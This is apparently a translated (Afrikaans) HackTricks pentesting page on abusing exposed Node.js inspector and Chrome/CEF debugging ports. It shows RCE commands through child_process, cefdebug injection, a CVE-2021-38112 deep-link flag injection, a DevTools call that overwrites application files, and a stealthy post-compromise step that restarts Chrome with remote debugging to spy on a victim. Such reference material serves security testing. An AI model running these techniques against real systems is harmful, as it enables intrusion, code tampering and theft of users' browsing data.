# Node inspector/CEF debug misbruik

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Wanneer dit met die `--inspect` skakel begin, luister 'n Node.js-proses vir 'n debug-klient. Deur **standaard** sal dit luister op gasheer en poort **`127.0.0.1:9229`**. Elke proses word ook aan 'n **unieke** **UUID** toegeken.

Inspector-kliente moet die gasheeradres, poort en UUID weet en spesifiseer om te verbind. 'n Volledige URL sal iets soos `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` lyk.

> [!WARNING]
> Aangesien die **debugger volle toegang tot die Node.js-uitvoeringsomgewing het**, mag 'n kwaadwillige akteur wat in staat is om met hierdie poort te verbind, in staat wees om arbitrêre kode namens die Node.js-proses uit te voer (**potensiële privilige-eskalasie**).

Daar is verskeie maniere om 'n inspektor te begin:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wanneer jy 'n ondersoekte proses begin, sal iets soos dit verskyn:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Proses gebaseer op **CEF** (**Chromium Embedded Framework**) moet die param gebruik: `--remote-debugging-port=9222` om die **debugger** oop te maak (die SSRF beskermings bly baie soortgelyk). Hulle **in plaas daarvan** om 'n **NodeJS** **debug** sessie te verleen, sal met die blaaier kommunikeer deur die [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), dit is 'n koppelvlak om die blaaiers te beheer, maar daar is nie 'n direkte RCE nie.

Wanneer jy 'n gedebugde blaaiers begin, sal iets soos dit verskyn:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets en same-origin beleid <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Webwerwe wat in 'n web-blaaier oopgemaak word, kan WebSocket en HTTP versoeke maak onder die blaaiers se sekuriteitsmodel. 'n **Aanvanklike HTTP-verbinding** is nodig om **'n unieke debugger sessie id** te **verkry**. Die **same-origin-beleid** **verhinder** webwerwe om **hierdie HTTP-verbinding** te maak. Vir addisionele sekuriteit teen [**DNS rebinding aanvalle**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** verifieer Node.js dat die **'Host' headers** vir die verbinding of 'n **IP adres** of **`localhost`** of **`localhost6`** presies spesifiseer.

> [!NOTE]
> Hierdie **sekuriteitsmaatreëls verhinder die benutting van die inspekteur** om kode te laat loop deur **net 'n HTTP versoek te stuur** (wat gedoen kon word deur 'n SSRF kwesbaarheid te benut).

### Begin inspekteur in lopende prosesse

Jy kan die **sein SIGUSR1** na 'n lopende nodejs-proses stuur om dit te **laat begin die inspekteur** in die standaardpoort. Let egter daarop dat jy genoeg voorregte moet hê, so dit mag jou **voorregte toegang tot inligting binne die proses** gee, maar nie 'n direkte voorregte-eskalasie nie.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!NOTE]
> Dit is nuttig in houers omdat **om die proses af te sluit en 'n nuwe een te begin** met `--inspect` **nie 'n opsie** is nie omdat die **houer** saam met die proses **vermoor** sal word.

### Verbind met inspekteur/debugger

Om met 'n **Chromium-gebaseerde blaaier** te verbind, kan die `chrome://inspect` of `edge://inspect` URL's vir Chrome of Edge, onderskeidelik, toeganklik gemaak word. Deur op die Konfigureer-knoppie te klik, moet verseker word dat die **teikenhost en poort** korrek gelys is. Die beeld toon 'n Voorbeeld van Afgeleide Kode-uitvoering (RCE):

![](<../../images/image (674).png>)

Met die **opdraglyn** kan jy met 'n debugger/inspekteur verbind met:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Die hulpmiddel [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) laat toe om **inspekteurs** wat plaaslik loop te **vind** en **kode** daarin te **injekteer**.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!NOTE]
> Let daarop dat **NodeJS RCE exploits nie sal werk** as dit aan 'n blaaskode gekoppel is via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (jy moet die API nagaan om interessante dinge te vind om daarmee te doen).

## RCE in NodeJS Debugger/Inspector

> [!NOTE]
> As jy hier gekom het om te kyk hoe om [**RCE uit 'n XSS in Electron te verkry, kyk asseblief na hierdie bladsy.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Sommige algemene maniere om **RCE** te verkry wanneer jy kan **verbinde** met 'n Node **inspector** is om iets soos (lyk of dit **nie sal werk in 'n verbinding met Chrome DevTools protocol**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
In hierdie afdeling sal ek net interessante dinge lys wat ek vind mense gebruik het om hierdie protokol te ontgin.

### Parameter Injection via Deep Links

In die [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) het Rhino-sekuriteit ontdek dat 'n toepassing gebaseer op CEF **'n persoonlike UR**I in die stelsel geregistreer het (workspaces://index.html) wat die volle URI ontvang het en toe **die CEF-gebaseerde toepassing** met 'n konfigurasie wat gedeeltelik van daardie URI saamgestel is, gelaai het.

Daar is ontdek dat die URI parameters URL-dekodeer is en gebruik is om die CEF-basis toepassing te laai, wat 'n gebruiker in staat gestel het om die vlag **`--gpu-launcher`** in die **opdraglyn** in te voeg en arbitrêre dinge uit te voer.

So, 'n payload soos:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
sal 'n calc.exe uitvoer.

### Oorskrywe Lêers

Verander die gids waar **afgelaaide lêers gestoor gaan word** en laai 'n lêer af om die **bronkode** van die toepassing wat gereeld gebruik word met jou **kwaadwillige kode** te **oorskry**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE en eksfiltrasie

Volgens hierdie pos: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) is dit moontlik om RCE te verkry en interne bladsye van theriver te eksfiltreer.

### Post-Exploitasie

In 'n werklike omgewing en **na die kompromittering** van 'n gebruiker se rekenaar wat 'n Chrome/Chromium-gebaseerde blaaier gebruik, kan jy 'n Chrome-proses met die **debugging geaktiveer en die debugging-poort deurgee** sodat jy toegang kan verkry. Op hierdie manier sal jy in staat wees om **alles wat die slagoffer met Chrome doen te inspekteer en sensitiewe inligting te steel**.

Die stealth manier is om **elke Chrome-proses te beëindig** en dan iets soos te roep
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Verwysings

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
